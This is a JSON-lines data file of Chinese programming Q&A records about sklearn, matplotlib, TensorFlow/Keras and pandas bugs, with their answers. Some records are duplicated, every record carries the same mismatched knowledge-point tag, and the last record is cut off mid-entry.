{"Answer": "&lt;p&gt;sklearn.tree.DecisionTreeClassifier()在进行分支的时候特征选择是随机的&amp;#xff0c;即使是splitter&amp;#61;”best”的时候。打印dt_clf.feature_importances_的话就会看到有两种不同的结果&amp;#xff0c;对应两种决策边界。sklearn.tree.DecisionTreeClassifier的函数说明中明确说&amp;#xff1a;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;&lt;strong&gt;random_state&amp;#xff1a;int, RandomState instance or None, default&amp;#61;None&lt;/strong&gt;&lt;br /&gt;Controls the randomness of the estimator. &lt;strong&gt;The features are always randomly permuted at each split, even if splitter is set to &amp;#34;best&amp;#34;.&lt;/strong&gt; When max_features &amp;lt; n_features, the algorithm will select max_features at random at each split before finding the best split among them. But the best found split may vary across different runs, even if max_features&amp;#61;n_features. That is the case, if the improvement of the criterion is identical for several splits and one split has to be selected at random. To obtain a deterministic behaviour during fitting, random_state has to be fixed to an integer. See Glossary for details.&lt;/p&gt;\n&lt;/blockquote&gt;", "Konwledge_Point": "NP完全问题", "Question": ["机器学习决策树鸢尾花数据集，绘制决策边界，出现相同代码相同数据多次运行，结果不一致的问题", ["练习机器学习中，采用决策树将鸢尾花的数据进行分类，并绘制决策边界，代码如下：", "\n", "import", " numpy as np\n", "import", " matplotlib.pyplot as plt\nfrom sklearn ", "import", " datasets\n", "iris", " = datasets.load_iris()\n", "x", " = iris.data[:,", "2", ":]\n", "y", " = iris.target\nfrom sklearn.tree ", "import", " DecisionTreeClassifier\n", "dt_clf", " = DecisionTreeClassifier(", "max_depth", " = ", "2", ",", "criterion", " = 'entropy')\ndt_clf.fit(x,y)\n\ndef plot_decision_boundary(model,axis):\n    x0,", "x1", " = np.meshgrid(\n        np.linspace(axis[", "0", "],axis[", "1", "],int((axis[", "1", "]-axis[", "0", "])*", "200", ")),\n        np.linspace(axis[", "2", "],axis[", "3", "],int((axis[", "3", "]-axis[", "2", "])*", "200", "))\n    )\n    \n    ", "x_new", " = np.c_[x0.ravel(),x1.ravel()]\n    ", "y_predict", " = model.predict(x_new)\n    ", "zz", " = y_predict.reshape(x0.shape)\n    \n    from matplotlib.colors ", "import", " ListedColormap\n    ", "custom_cmap", " = ListedColormap(['", "#EF9A9A','#FFF59D','#90CAF9'])", "\n    plt.contourf(x0,x1,zz,", "cmap", " = custom_cmap)\n\nplot_decision_boundary(dt_clf,", "axis=", " [", "0.5", ",", "7.5", ",", "0", ",", "3", "])\nplt.scatter(x[", "y==0,0],x[y==0,1])", "\nplt.scatter(x[", "y==1,0],x[y==1,1])", "\nplt.scatter(x[", "y==2,0],x[y==2,1])", "\nplt.show() ", "# 这个结果有点不对 ，但我又不知道哪里搞错了", "\n", "\n", "第一次运行出现了下图所示的分类结果：", "\n", "第二次及以后运行时出现了下图的分类结果：", "\n", "我想知道明明是相同的数据，相同的代码，只是运行先后顺序不同，为什么会出现上下两个图之间的完全不同的分类结果，并且出现哪种分类结果还有一定的随机性？我的代码里也没有随机数。虽然非参数学习对于数据依赖非常严重，但是我的数据也没有发生更改啊，很奇怪。"]], "Tag": "算法设计"}
{"Answer": "import numpy as np\r\nimport matplotlib.pyplot as plt\r\n\r\nx = np.random.rand(100).reshape(10,10)\r\nplt.xticks(np.arange(10)+0.5,['x','y','z','h','j','k','t','f','q','p'])\r\nplt.yticks(np.arange(10)+0.5,['x','y','z','h','j','k','t','f','q','p'])\r\nplt.imshow(x, cmap=plt.cm.hot, vmin=0, vmax=1)\r\nplt.title('color-fast')\r\nplt.colorbar()\r\nplt.show()", "Konwledge_Point": "NP完全问题", "Question": ["如何使用matplotlib生成如下热力图", ["\n如上图，要求有标题，横纵坐标都为字母，右边有热力图图例，总之越像越好。最好标题和横纵坐标都和上图一致，中间的数据以列表形式给出，代码中多加点注释，我好理解一点。本人新手，以前没接触过绘图，知道很麻烦各位大神，请大神见谅。谢谢！", "\n其实关于matplotlib生成热力图的问题我也看过不少，但好像没有完全能用的。我看到有个相似的代码如下，但缺少右边的colorbar，请问大神如何修改代码添加colorbar？：", "\nimport matplotlib.pyplot as plt", "\nimport numpy as np", "\ncolumn_labels = list('ABCD')", "\nrow_labels = list('WXYZ')", "\ndata = np.random.rand(4,4)", "\nfig, ax = plt.subplots()", "\nheatmap = ax.pcolor(data, cmap=plt.cm.Blues)", "\n\n", "ax.set_xticks(np.arange(data.shape[0])+0.5, minor=False)", "\nax.set_yticks(np.arange(data.shape[1])+0.5, minor=False)", "\n\n", "ax.invert_yaxis()", "\nax.xaxis.tick_top()", "\n\n", "ax.set_xticklabels(row_labels, minor=False)", "\nax.set_yticklabels(column_labels, minor=False)", "\n\n", "plt.show()"]], "Tag": "算法设计"}
{"Answer": "import numpy as np\r\nimport matplotlib.pyplot as plt\r\n\r\nx = np.random.rand(100).reshape(10,10)\r\nplt.xticks(np.arange(10)+0.5,['x','y','z','h','j','k','t','f','q','p'])\r\nplt.yticks(np.arange(10)+0.5,['x','y','z','h','j','k','t','f','q','p'])\r\nplt.imshow(x, cmap=plt.cm.hot, vmin=0, vmax=1)\r\nplt.title('color-fast')\r\nplt.colorbar()\r\nplt.show()", "Konwledge_Point": "NP完全问题", "Question": ["如何使用matplotlib生成如下热力图", ["\n如上图，要求有标题，横纵坐标都为字母，右边有热力图图例，总之越像越好。最好标题和横纵坐标都和上图一致，中间的数据以列表形式给出，代码中多加点注释，我好理解一点。本人新手，以前没接触过绘图，知道很麻烦各位大神，请大神见谅。谢谢！", "\n其实关于matplotlib生成热力图的问题我也看过不少，但好像没有完全能用的。我看到有个相似的代码如下，但缺少右边的colorbar，请问大神如何修改代码添加colorbar？：", "\nimport matplotlib.pyplot as plt", "\nimport numpy as np", "\ncolumn_labels = list('ABCD')", "\nrow_labels = list('WXYZ')", "\ndata = np.random.rand(4,4)", "\nfig, ax = plt.subplots()", "\nheatmap = ax.pcolor(data, cmap=plt.cm.Blues)", "\n\n", "ax.set_xticks(np.arange(data.shape[0])+0.5, minor=False)", "\nax.set_yticks(np.arange(data.shape[1])+0.5, minor=False)", "\n\n", "ax.invert_yaxis()", "\nax.xaxis.tick_top()", "\n\n", "ax.set_xticklabels(row_labels, minor=False)", "\nax.set_yticklabels(column_labels, minor=False)", "\n\n", "plt.show()"]], "Tag": "算法设计"}
{"Answer": "可以试着调整神经层的结构和模型的超参数，试着多次调整达到对每个参数的理解，建议可以先简要看看莫烦的视频教程，对各个参数有个大致了解，这是链接https://morvanzhou.github.io/", "Konwledge_Point": "NP完全问题", "Question": ["Tensorflow建一个神经网络，输出数据只有一个谱型，且杂乱", ["建了一个神经网络，输入节点3个，输出250个，两个隐藏层，节点数分别为200个。", "\n训练数据集为100000个。运行完后用测试集验证，发现预测的谱线杂乱无章，跟测试的谱线集完全无关，从图中看感觉是在一个谱型附近震荡。", "\n 初学者不明白是什么原因，不知有没有大神可以稍加指教。", "\n\n", "import tensorflow as tf\nimport numpy as np\n# 添加层\ndef add_layer(inputs, in_size, out_size,n_layer,activation_function=None):\n          Weights = tf.Variable(tf.random_normal([in_size, out_size]))\n          Wx_plus_b = tf.matmul(inputs, Weights)\n          if activation_function is None:\n           outputs = Wx_plus_b\n          else:\n               outputs = activation_function(Wx_plus_b)\n          return outputs\n# 1.训练的数据\np_1= np.loadtxt('D:p_train.txt')\np=np.reshape(p_1,(3,100000))\ns_1= np.loadtxt('D:s_train.txt')\ns=np.reshape(s_1,(250,100000))\npmin=p.min()\npmax=p.max()\np_train=(p-pmin)/(pmax-pmin)\nsmin=s.min()\nsmax=s.max()\ns_train=(s-smin)/(smax-smin)\np_train=np.transpose(p_train)\ns_train=np.transpose(s_train)\np_train=p_train.tolist()\ns_train=s_train.tolist()\n# 2.测试的数据\np_2=np.loadtxt('D:p_test.txt')\np2=np.reshape(p_2,(3,5501))\ns_2=np.loadtxt('D:s_test.txt')\ns2=np.reshape(s_2,(250,5501))\npmin2=p2.min()\npmax2=p2.max()\np_test=(p2-pmin2)/(pmax2-pmin2)\nsmin2=s2.min()\nsmax2=s2.max()\ns_test=(s2-smin2)/(smax2-smin2)\np_test=np.transpose(p_test)\ns_test=np.transpose(s_test)\np_test=p_test.tolist()\ns_test=s_test.tolist()\n\n# 3.定义占位符 \npx = tf.placeholder(tf.float32, [None, 3])\nsx = tf.placeholder(tf.float32, [None,250])\nsy=tf.placeholder(tf.float32,[None,250])\n# 4.定义神经层：隐藏层和预测层\nl1 = add_layer(px, 3, 200, n_layer=1,activation_function=tf.nn.sigmoid)\nl2=add_layer(l1,200,200,n_layer=2,activation_function=tf.nn.sigmoid)\nprediction = add_layer(l2, 200, 250, n_layer=3,activation_function=None)\n\n# 5.定义 loss 表达式 mse\nloss = tf.reduce_mean(tf.square(sx - prediction))\n#loss2\n\n# 6.选择 optimizer 使 loss 达到最小                   \ntrain_step = tf.train.AdamOptimizer(0.01,epsilon=1e-8).minimize(loss)\n\n#7.初始化变量\ninit=tf.initialize_all_variables()\n#8.定义会话\nsess = tf.Session()\n#9.运行\nsess.run(init) \n#10.查看loss变化\nfor step in range(1000):\n   sess.run(train_step, feed_dict={px:p_train, sx:s_train})\n   if step % 50 == 0:    \n        print(sess.run(loss,feed_dict={sx:s_train,px:p_train}))\n\nprediction_test=sess.run(prediction,feed_dict={px:p_test})\n\n"]], "Tag": "算法设计"}
{"Answer": "可以试着调整神经层的结构和模型的超参数，试着多次调整达到对每个参数的理解，建议可以先简要看看莫烦的视频教程，对各个参数有个大致了解，这是链接https://morvanzhou.github.io/", "Konwledge_Point": "NP完全问题", "Question": ["Tensorflow建一个神经网络，输出数据只有一个谱型，且杂乱", ["建了一个神经网络，输入节点3个，输出250个，两个隐藏层，节点数分别为200个。", "\n训练数据集为100000个。运行完后用测试集验证，发现预测的谱线杂乱无章，跟测试的谱线集完全无关，从图中看感觉是在一个谱型附近震荡。", "\n 初学者不明白是什么原因，不知有没有大神可以稍加指教。", "\n\n", "import tensorflow as tf\nimport numpy as np\n# 添加层\ndef add_layer(inputs, in_size, out_size,n_layer,activation_function=None):\n          Weights = tf.Variable(tf.random_normal([in_size, out_size]))\n          Wx_plus_b = tf.matmul(inputs, Weights)\n          if activation_function is None:\n           outputs = Wx_plus_b\n          else:\n               outputs = activation_function(Wx_plus_b)\n          return outputs\n# 1.训练的数据\np_1= np.loadtxt('D:p_train.txt')\np=np.reshape(p_1,(3,100000))\ns_1= np.loadtxt('D:s_train.txt')\ns=np.reshape(s_1,(250,100000))\npmin=p.min()\npmax=p.max()\np_train=(p-pmin)/(pmax-pmin)\nsmin=s.min()\nsmax=s.max()\ns_train=(s-smin)/(smax-smin)\np_train=np.transpose(p_train)\ns_train=np.transpose(s_train)\np_train=p_train.tolist()\ns_train=s_train.tolist()\n# 2.测试的数据\np_2=np.loadtxt('D:p_test.txt')\np2=np.reshape(p_2,(3,5501))\ns_2=np.loadtxt('D:s_test.txt')\ns2=np.reshape(s_2,(250,5501))\npmin2=p2.min()\npmax2=p2.max()\np_test=(p2-pmin2)/(pmax2-pmin2)\nsmin2=s2.min()\nsmax2=s2.max()\ns_test=(s2-smin2)/(smax2-smin2)\np_test=np.transpose(p_test)\ns_test=np.transpose(s_test)\np_test=p_test.tolist()\ns_test=s_test.tolist()\n\n# 3.定义占位符 \npx = tf.placeholder(tf.float32, [None, 3])\nsx = tf.placeholder(tf.float32, [None,250])\nsy=tf.placeholder(tf.float32,[None,250])\n# 4.定义神经层：隐藏层和预测层\nl1 = add_layer(px, 3, 200, n_layer=1,activation_function=tf.nn.sigmoid)\nl2=add_layer(l1,200,200,n_layer=2,activation_function=tf.nn.sigmoid)\nprediction = add_layer(l2, 200, 250, n_layer=3,activation_function=None)\n\n# 5.定义 loss 表达式 mse\nloss = tf.reduce_mean(tf.square(sx - prediction))\n#loss2\n\n# 6.选择 optimizer 使 loss 达到最小                   \ntrain_step = tf.train.AdamOptimizer(0.01,epsilon=1e-8).minimize(loss)\n\n#7.初始化变量\ninit=tf.initialize_all_variables()\n#8.定义会话\nsess = tf.Session()\n#9.运行\nsess.run(init) \n#10.查看loss变化\nfor step in range(1000):\n   sess.run(train_step, feed_dict={px:p_train, sx:s_train})\n   if step % 50 == 0:    \n        print(sess.run(loss,feed_dict={sx:s_train,px:p_train}))\n\nprediction_test=sess.run(prediction,feed_dict={px:p_test})\n\n"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;loss不是binary_crossentropy&amp;#xff1f;&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["tensorflow中model.fit（）函数输入参数报错，如何解决？", ["问题遇到的现象和发生背景", "\n", "问题相关代码，请勿粘贴截图", "\n", "import pandas as pd", "import numpy as np", "import matplotlib.pyplot as plt", "filepath_dict = 'venv\\Data.csv'", "df = pd.read_csv(filepath_dict  )", "sentences = df['headlines'].values", "y = df['target'].values", "Y = []", "for target in y:", "    if target == 'Sarcastic':", "        Y.append(1)", "    else:", "        Y.append(0)", "from sklearn.model_selection import train_test_split", "sentences_train,sentences_test,Y_train,Y_test = train_test_split(sentences,Y,test_size=0.5,random_state=500)", "from keras.preprocessing.text import Tokenizer", "tokenizer = Tokenizer(num_words=10000)", "tokenizer.fit_on_texts(sentences)", "maxlen = 300", "vocab_size = len(tokenizer.word_index)+1", "#embedding模型", "\n", "X_train = tokenizer.texts_to_sequences(sentences_train)", "X_test = tokenizer.texts_to_sequences(sentences_test)", "from keras.preprocessing.sequence import pad_sequences", "X_train = pad_sequences(X_train,padding='post',maxlen=maxlen)", "X_test = pad_sequences(X_test,padding='post',maxlen=maxlen)", "Y_test = np.array(Y_test)", "Y_train = np.array(Y_train)", "#结束", "\n", "embedding_dim = 300", "from keras.models import  Sequential", "from  keras import  layers", "from keras.layers import Dense,Activation,Dropout,LSTM", "from keras.optimizer_v2 import adam", "model = Sequential()", "model.add(layers.Embedding(vocab_size,", "                           embedding_dim,", "                           input_length=maxlen,", "                           trainable=True))", "model.add(LSTM(128,return_sequences=True))", "model.add(LSTM(64,return_sequences=False))", "model.add(layers.Dense(15,activation='relu'))", "model.add(layers.Dense(1,activation='sigmoid'))", "model.compile(optimizer='adam',", "              loss = 'bomart_crossentropy',", "              metrics=  ['accuracy'])", "model.summary()", "history = model.fit(X_train,", "                    Y_train,", "                    epochs=20,", "                    verbose=False,", "                    validation_data=(X_test,Y_test),", "                    batch_size=10)", "\n", "运行结果及报错内容", "\n", "Traceback (most recent call last):", "  File \"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\\main.py\", line 63, in ", "    history = model.fit(X_train,", "  File \"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\\venv\\lib\\site-packages\\keras\\utils\\traceback_utils.py\", line 67, in error_handler", "    raise e.with_traceback(filtered_tb) from None", "  File \"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\\venv\\lib\\site-packages\\tensorflow\\python\\framework\\func_graph.py\", line 1147, in autograph_handler", "    raise e.ag_error_metadata.to_exception(e)", "ValueError: in user code:", "\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "1021", ", ", "in", " ", "train_function", "  ", "*", "\n    ", "return", " ", "step_function", "(", "self", ", ", "iterator", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "1010", ", ", "in", " ", "step_function", "  ", "*", "*", "\n    ", "outputs", " ", "=", " ", "model", ".", "distribute_strategy", ".", "run", "(", "run_step", ", ", "args", "=", "(", "data", ",))\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "1000", ", ", "in", " ", "run_step", "  ", "*", "*", "\n    ", "outputs", " ", "=", " ", "model", ".", "train_step", "(", "data", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "860", ", ", "in", " ", "train_step", "\n    ", "loss", " ", "=", " ", "self", ".", "compute_loss", "(", "x", ", ", "y", ", ", "y_pred", ", ", "sample_weight", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "918", ", ", "in", " ", "compute_loss", "\n    ", "return", " ", "self", ".", "compiled_loss", "(\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine\\compile_utils.py\"", ", ", "line", " ", "184", ", ", "in", " ", "__call__", "\n    ", "self", ".", "build", "(", "y_pred", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine\\compile_utils.py\"", ", ", "line", " ", "133", ", ", "in", " ", "build", "\n    ", "self", ".", "_losses", " ", "=", " ", "tf", ".", "nest", ".", "map_structure", "(", "self", ".", "_get_loss_object", ", ", "self", ".", "_losses", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine\\compile_utils.py\"", ", ", "line", " ", "272", ", ", "in", " ", "_get_loss_object", "\n    ", "loss", " ", "=", " ", "losses_mod", ".", "get", "(", "loss", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras\\losses.py\"", ", ", "line", " ", "2369", ", ", "in", " ", "get", "\n    ", "return", " ", "deserialize", "(", "identifier", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras\\losses.py\"", ", ", "line", " ", "2324", ", ", "in", " ", "deserialize", "\n    ", "return", " ", "deserialize_keras_object", "(\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras\\utils\\generic_utils.py\"", ", ", "line", " ", "709", ", ", "in", " ", "deserialize_keras_object", "\n    ", "raise", " ", "ValueError", "(\n\n", "ValueError", ": ", "Unknown", " ", "loss", " ", "function", ": ", "bomart_crossentropy", ". ", "Please", " ", "ensure", " ", "this", " ", "object", " ", "is", " ", "passed", " ", "to", " ", "the", " `", "custom_objects", "` ", "argument", ". ", "See", " ", "https", ":", "//www.tensorflow.org/guide/keras/save_and_serialize#registering_the_custom_object for details.", "\n", "\n", "我的解答思路和尝试过的方法", "\n", "似乎我完全没有找到方法解决，求指教", "\n", "我想要达到的结果"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;loss不是binary_crossentropy&amp;#xff1f;&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["tensorflow中model.fit（）函数输入参数报错，如何解决？", ["问题遇到的现象和发生背景", "\n", "问题相关代码，请勿粘贴截图", "\n", "import pandas as pd", "import numpy as np", "import matplotlib.pyplot as plt", "filepath_dict = 'venv\\Data.csv'", "df = pd.read_csv(filepath_dict  )", "sentences = df['headlines'].values", "y = df['target'].values", "Y = []", "for target in y:", "    if target == 'Sarcastic':", "        Y.append(1)", "    else:", "        Y.append(0)", "from sklearn.model_selection import train_test_split", "sentences_train,sentences_test,Y_train,Y_test = train_test_split(sentences,Y,test_size=0.5,random_state=500)", "from keras.preprocessing.text import Tokenizer", "tokenizer = Tokenizer(num_words=10000)", "tokenizer.fit_on_texts(sentences)", "maxlen = 300", "vocab_size = len(tokenizer.word_index)+1", "#embedding模型", "\n", "X_train = tokenizer.texts_to_sequences(sentences_train)", "X_test = tokenizer.texts_to_sequences(sentences_test)", "from keras.preprocessing.sequence import pad_sequences", "X_train = pad_sequences(X_train,padding='post',maxlen=maxlen)", "X_test = pad_sequences(X_test,padding='post',maxlen=maxlen)", "Y_test = np.array(Y_test)", "Y_train = np.array(Y_train)", "#结束", "\n", "embedding_dim = 300", "from keras.models import  Sequential", "from  keras import  layers", "from keras.layers import Dense,Activation,Dropout,LSTM", "from keras.optimizer_v2 import adam", "model = Sequential()", "model.add(layers.Embedding(vocab_size,", "                           embedding_dim,", "                           input_length=maxlen,", "                           trainable=True))", "model.add(LSTM(128,return_sequences=True))", "model.add(LSTM(64,return_sequences=False))", "model.add(layers.Dense(15,activation='relu'))", "model.add(layers.Dense(1,activation='sigmoid'))", "model.compile(optimizer='adam',", "              loss = 'bomart_crossentropy',", "              metrics=  ['accuracy'])", "model.summary()", "history = model.fit(X_train,", "                    Y_train,", "                    epochs=20,", "                    verbose=False,", "                    validation_data=(X_test,Y_test),", "                    batch_size=10)", "\n", "运行结果及报错内容", "\n", "Traceback (most recent call last):", "  File \"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\\main.py\", line 63, in ", "    history = model.fit(X_train,", "  File \"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\\venv\\lib\\site-packages\\keras\\utils\\traceback_utils.py\", line 67, in error_handler", "    raise e.with_traceback(filtered_tb) from None", "  File \"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\\venv\\lib\\site-packages\\tensorflow\\python\\framework\\func_graph.py\", line 1147, in autograph_handler", "    raise e.ag_error_metadata.to_exception(e)", "ValueError: in user code:", "\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "1021", ", ", "in", " ", "train_function", "  ", "*", "\n    ", "return", " ", "step_function", "(", "self", ", ", "iterator", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "1010", ", ", "in", " ", "step_function", "  ", "*", "*", "\n    ", "outputs", " ", "=", " ", "model", ".", "distribute_strategy", ".", "run", "(", "run_step", ", ", "args", "=", "(", "data", ",))\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "1000", ", ", "in", " ", "run_step", "  ", "*", "*", "\n    ", "outputs", " ", "=", " ", "model", ".", "train_step", "(", "data", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "860", ", ", "in", " ", "train_step", "\n    ", "loss", " ", "=", " ", "self", ".", "compute_loss", "(", "x", ", ", "y", ", ", "y_pred", ", ", "sample_weight", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "918", ", ", "in", " ", "compute_loss", "\n    ", "return", " ", "self", ".", "compiled_loss", "(\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine\\compile_utils.py\"", ", ", "line", " ", "184", ", ", "in", " ", "__call__", "\n    ", "self", ".", "build", "(", "y_pred", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine\\compile_utils.py\"", ", ", "line", " ", "133", ", ", "in", " ", "build", "\n    ", "self", ".", "_losses", " ", "=", " ", "tf", ".", "nest", ".", "map_structure", "(", "self", ".", "_get_loss_object", ", ", "self", ".", "_losses", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine\\compile_utils.py\"", ", ", "line", " ", "272", ", ", "in", " ", "_get_loss_object", "\n    ", "loss", " ", "=", " ", "losses_mod", ".", "get", "(", "loss", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras\\losses.py\"", ", ", "line", " ", "2369", ", ", "in", " ", "get", "\n    ", "return", " ", "deserialize", "(", "identifier", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras\\losses.py\"", ", ", "line", " ", "2324", ", ", "in", " ", "deserialize", "\n    ", "return", " ", "deserialize_keras_object", "(\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras\\utils\\generic_utils.py\"", ", ", "line", " ", "709", ", ", "in", " ", "deserialize_keras_object", "\n    ", "raise", " ", "ValueError", "(\n\n", "ValueError", ": ", "Unknown", " ", "loss", " ", "function", ": ", "bomart_crossentropy", ". ", "Please", " ", "ensure", " ", "this", " ", "object", " ", "is", " ", "passed", " ", "to", " ", "the", " `", "custom_objects", "` ", "argument", ". ", "See", " ", "https", ":", "//www.tensorflow.org/guide/keras/save_and_serialize#registering_the_custom_object for details.", "\n", "\n", "我的解答思路和尝试过的方法", "\n", "似乎我完全没有找到方法解决，求指教", "\n", "我想要达到的结果"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;可能要把&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-python\"&gt;&lt;span class=\"hljs-attribute\"&gt;df_test_1&lt;/span&gt;.loc[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;:len(fn_cur) - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, columns[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]] &amp;#61; fn_cur\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;改成&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-python\"&gt;&lt;span class=\"hljs-attribute\"&gt;df_test_1&lt;/span&gt;.loc[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;:len(fn_cur) - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, columns_[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]] &amp;#61; fn_cur\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "NP完全问题", "Question": ["pandas莫名多出一列", ["pandas今天运行的时候发现了一个很神奇的bug, 目前不懂原理, 希望大家看看", "\n", "columns_", " =", " [ \"输入频阶\", \"输入频率\", \"输出频率\", \"输出频率(全)\"]", "\n", "df_test_1", " = pd.DataFrame(np.full((", "21", ", ", "4", "), ''), columns=columns_)\n", "# 插入数据", "\n", "df_test_1", ".loc[", "0", ":len(fn_cur) - ", "1", ", columns[", "0", "]] = fn_cur\n", "df_test_1", ".loc[", "0", ":len(freq_list) - ", "1", ", columns[", "1", "]] = freq_list\n", "df_test_1", ".loc[", "0", ":len(freq_list_n[", "0", "]) - ", "1", ", columns[", "2", "]] = freq_list_n[", "0", "]\n", "df_test_1", ".loc[", "0", ":len(freq_list_n[", "1", "]) - ", "1", ", columns[", "3", "]] = freq_list_n[", "1", "]\n", "print", "(df_test_1)\n", "\n", "我当前的新建表格拿来承载新数据, 但是出现了一个意料之外的错误", "\n", "\n", "跑完程序发现, 竟然多出来列  在完全没有添加的情况下, 有点不可思议, 然后我用调试模式一步步试了一试, 多出来的列索引是插入列数据来的", "\n", "下面我插入一列数据", "\n", "\n", "再看看df, 很不可思议已经多出来一列, 这里fn_cur就是一个简单的列表而已, 并不带这个列值~~", "\n", "所以, 这是怎么产生的呢"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;可能要把&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-python\"&gt;&lt;span class=\"hljs-attribute\"&gt;df_test_1&lt;/span&gt;.loc[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;:len(fn_cur) - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, columns[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]] &amp;#61; fn_cur\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;改成&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-python\"&gt;&lt;span class=\"hljs-attribute\"&gt;df_test_1&lt;/span&gt;.loc[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;:len(fn_cur) - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, columns_[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]] &amp;#61; fn_cur\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "NP完全问题", "Question": ["pandas莫名多出一列", ["pandas今天运行的时候发现了一个很神奇的bug, 目前不懂原理, 希望大家看看", "\n", "columns_", " =", " [ \"输入频阶\", \"输入频率\", \"输出频率\", \"输出频率(全)\"]", "\n", "df_test_1", " = pd.DataFrame(np.full((", "21", ", ", "4", "), ''), columns=columns_)\n", "# 插入数据", "\n", "df_test_1", ".loc[", "0", ":len(fn_cur) - ", "1", ", columns[", "0", "]] = fn_cur\n", "df_test_1", ".loc[", "0", ":len(freq_list) - ", "1", ", columns[", "1", "]] = freq_list\n", "df_test_1", ".loc[", "0", ":len(freq_list_n[", "0", "]) - ", "1", ", columns[", "2", "]] = freq_list_n[", "0", "]\n", "df_test_1", ".loc[", "0", ":len(freq_list_n[", "1", "]) - ", "1", ", columns[", "3", "]] = freq_list_n[", "1", "]\n", "print", "(df_test_1)\n", "\n", "我当前的新建表格拿来承载新数据, 但是出现了一个意料之外的错误", "\n", "\n", "跑完程序发现, 竟然多出来列  在完全没有添加的情况下, 有点不可思议, 然后我用调试模式一步步试了一试, 多出来的列索引是插入列数据来的", "\n", "下面我插入一列数据", "\n", 